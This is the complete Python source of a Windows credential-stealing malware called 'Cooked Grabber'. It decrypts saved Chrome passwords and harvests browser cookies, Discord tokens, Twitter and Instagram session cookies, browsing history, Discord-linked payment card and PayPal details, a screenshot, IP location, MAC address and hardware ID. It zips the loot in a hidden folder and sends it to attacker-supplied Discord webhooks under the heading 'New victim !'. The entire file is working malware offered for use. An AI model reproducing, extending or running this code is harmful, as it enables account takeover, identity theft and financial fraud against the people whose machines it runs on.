import os, sys, win32con, browser_cookie3
from json import loads
from base64 import b64decode
from sqlite3 import connect
from shutil import copyfile
from threading import Thread 
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from discord_webhook import DiscordEmbed, DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get
from re import findall, search
from win32api import SetFileAttributes, GetSystemMetrics
from browser_history import get_history
from prettytable import PrettyTable
from platform import platform
from getmac import get_mac_address as gma
from psutil import virtual_memory
from collections import defaultdict
from zipfile import ZipFile, ZIP_DEFLATED
from cpuinfo import get_cpu_info
from multiprocessing import freeze_support
from tempfile import TemporaryDirectory
from pyautogui import screenshot
from random import choices
from string import ascii_letters, digits

website = ['discord.com', 'twitter.com', 'instagram.com']

def get_screenshot(path):
    get_screenshot.scrn = screenshot()
    get_screenshot.scrn_path = os.path.join(path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png")
    get_screenshot.scrn.save(get_screenshot.scrn_path)

def get_hwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def get_user_data(tk):
    headers = {'Authorization': tk}
    response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    return [response['username'], response['discriminator'], response['email'], response['phone']]

def has_payment_methods(tk):
    headers = {'Authorization': tk}
    response=get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
    return response

def cookies_grabber_mod(u):
    cookies = []
    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
    for browser in browsers:
        try:
            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
        except:
            pass
    return cookies

def get_Personal_data():
    try:
        ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
        country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
        city=urlopen(Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
    except:
        city="City not found -_-"
        country="Country not found -_-"
        ip_address="No IP found -_-"
    return [ip_address, country, city]

def find_His():
    table = PrettyTable(padding_width=1)
    table.field_names = ["CurrentTime", "Link"]
    for his in get_history().histories:
        a, b = his
        if len(b) <= 100:
            table.add_row([a, b])
        else:
            x_= b.split("//")
            x__, x___= x_[1].count('/'), x_[1].split('/')
            if x___[0] != 'www.google.com':
                if x__ <= 5:
                    b = f"{x_[0]}//"
                    for p in x___:
                        if x___.index(p) != len(x___) - 1:
                            b += f"{p}/"
                    if len(b) <= 100:
                        table.add_row([a, b])
                    else:
                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                else:
                    b = f"{x_[0]}//{x___[0]}/[...]"
                    if len(b) <= 100:
                        table.add_row([a, b]) 
                    else:
                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
    return table.get_string()

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = loads(local_state)
    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def psw_chrome(path):
  
    def pass_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = loads(local_state)
        key = b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    log = ""
    count = 0
    key = pass_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    copyfile(db_path, "ChromeData.db")
    db = connect("ChromeData.db")
    cursor = db.cursor()
    cursor.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

    for row in cursor.fetchall():
        count = count+1
        origin_url = row[0]
        username = row[1]
        password = decrypt_password(row[2], key)
        if username or password:
            log = ((f"{log}\n=~=~=~=\n[{count}]\nOrigin URL: {origin_url}\nUsername or mail: {username}\nPassword: {password}")) 
        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove("ChromeData.db")
    except:
        pass
    if log == "":       
        with open(f"{path}\\Chrome_pass.txt", "a", encoding="utf-8") as f:
            f.write((f"\n\n\nCHROME PASSWORDS:\n\nAny chrome password founded !")) 
    else:
        with open(f"{path}\Chrome_pass.txt", "a", encoding="utf-8") as f:
            f.write((f"\n\n\nCHROME PASSWORDS:\n{log}")) 
    
def main(dirpath):
    filename = "Cookies.db"
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    if not os.path.isfile(filename):
        copyfile(db_path, os.path.join(dirpath, 'Cookies.db'))
    db = connect(os.path.join(dirpath, 'Cookies.db'))
    db.text_factory = lambda b: b.decode(errors="ignore")
    for w in website:
        if w == website[0]:
            tokens = []
            def discord_tokens(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in findall(regex, line):
                                if token not in tokens:
                                    tokens.append(token)
            paths = [
                os.path.join(os.getenv('LOCALAPPDATA'),"Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
                os.path.join(os.getenv('APPDATA'), "Discord", "Local Storage", "leveldb"),
                os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),
                os.path.join(os.getenv('APPDATA'), "discordptb"),
                os.path.join(os.getenv('APPDATA'), "discordcanary"),
                os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
                os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data", "Default")
            ]
            threads = []
            def find_wb(wb):
                if os.path.exists(wb):
                    threads.append(Thread(target=discord_tokens, args=(wb,)))
            for j in paths:
                find_wb(j)
            for t in threads:
                t.start()
                t.join()
        elif w == website[1]:
            t_cookies, t_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                t_cookies.append(b.split(', '))
            for c in t_cookies:
                for y in c:
                    if search(r"auth_token", y) != None:
                        t_lst.append(y.split(' ')[1].split("=")[1])
        elif w == website[2]:
            insta_cookies, insta_lst = ([] for _ in range(2))
            for b in cookies_grabber_mod(w):
                insta_cookies.append(b.split(', '))
            browser_ = defaultdict(dict)
            for c in insta_cookies:
                if all([search(r"ds_user_id", str(c))!=None, search(r"sessionid", str(c))!=None]):
                    for y in c:
                        conditions = [search(r"ds_user_id", y)!=None, search(r"sessionid", y)!=None]
                        if any(conditions):
                            browser_[insta_cookies.index(c)][conditions.index(True)] = y.split(' ')[1].split("=")[1]
            for x in list(dict(browser_).keys()):
                insta_lst.append(list(dict(browser_)[x].items()))
            for x in insta_lst:
                for y in x:
                    if x.index(y) != y[0]:
                        x[x.index(y)], x[y[0]] = x[y[0]], x[x.index(y)]
            for x in insta_lst:
                for y in x:
                    x[x.index(y)] = y[1]
    all_data_p = []
    for x in tokens:
        lst_b = has_payment_methods(x)
        try:
            for n in range(len(lst_b)):
                if lst_b[n]['type'] == 1:
                    writable = [lst_b[n]['brand'], lst_b[n]['type'], lst_b[n]['last_4'], lst_b[n]['expires_month'], lst_b[n]['expires_year'], lst_b[n]['billing_address']]
                    if writable not in all_data_p:
                        all_data_p.append(writable)
                elif lst_b[n]['type'] == 2:
                    writable_2 = [lst_b[n]['email'], lst_b[n]['type'], lst_b[n]['billing_address']]
                    if writable_2 not in all_data_p:
                        all_data_p.append(writable_2)
        except:
            pass
    db.commit()
    db.close()
    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p]

def send_webhook(DISCORD_WEBHOOK_URLs):
    p_lst = get_Personal_data()
    cpuinfo = get_cpu_info()
    with TemporaryDirectory(dir='.') as td:
        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        get_screenshot(path=td)
        psw_chrome(path=td)

        main_info = main(td)
        discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
        discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], []
        for t_ in main_info[0]:
            try:
                lst = get_user_data(t_)
                username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
                discord_T.add_row([t_, username, email, phone])
                verified_tokens.append(t_)
            except:
                pass
        for _t in main_info[1]:
            twitter_T.add_row([_t])
        for _t_ in main_info[2]:
            insta_T.add_row(_t_)
        pay_l = []
        for _p in main_info[3]:
            if _p[1] == 1:
                payment_card = PrettyTable(padding_width=1)
                payment_card.field_names = ["Brand", "Last 4","Type", "Expiration", "Billing Adress"]
                payment_card.add_row([_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
                pay_l.append(payment_card.get_string())
            elif _p[1] == 2:
                payment_p = PrettyTable(padding_width=1)
                payment_p.field_names = ["Email", "Type", "Billing Adress"]
                payment_p.add_row([_p[0], "Paypal", _p[2]])
                pay_l.append(payment_p.get_string())
        files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [os.path.join(td, "Instagram Tokens.txt"), insta_T]]
        for x_, y_ in files_names:
            if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0):
                with open(x_, 'w') as wr:
                    wr.write(y_.get_string())
        with ZipFile(os.path.join(td, 'data.zip'), mode='w', compression=ZIP_DEFLATED) as zip:
            if ('payment_card' or 'payment_p') in locals():
                with open(os.path.join(td, "Payment Info.txt"), 'w') as f:
                    for i in pay_l:
                        f.write(f"{i}\n")
                    zip.write(f.name)
            with open(os.path.join(td, 'History.txt'), 'w') as f:
                f.write(find_His())
                zip.write(f.name)
            with open(get_screenshot.scrn_path, "rb") as f:
                zip.write(f.name)
            with open(os.path.join(td, 'Chrome_pass.txt'), 'w') as f:
                zip.write(f.name)
            for name_f, _ in files_names:
                if os.path.exists(name_f):
                    zip.write(name_f)
        for URL in DISCORD_WEBHOOK_URLs:
            webhook = DiscordWebhook(url=URL, username='Cooked Grabber', avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png")
            embed = DiscordEmbed(title='New victim !', color='FFA500')
            embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
            embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
            embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
            embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
            card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
            embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
            embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
            embed.set_timestamp()
            with open(os.path.join(td, "data.zip"), 'rb') as f:
                webhook.add_file(file=f.read(), filename=f"Cooked-Grabber-{os.getenv('UserName')}.zip")
            webhook.add_embed(embed)
            webhook.execute()

if __name__ == "__main__":
    freeze_support()
    if len(sys.argv) == 1:
        send_webhook(['YOUR DISCORD WEBHOOK URL'])
    else:
        del sys.argv[0]
        send_webhook(sys.argv)
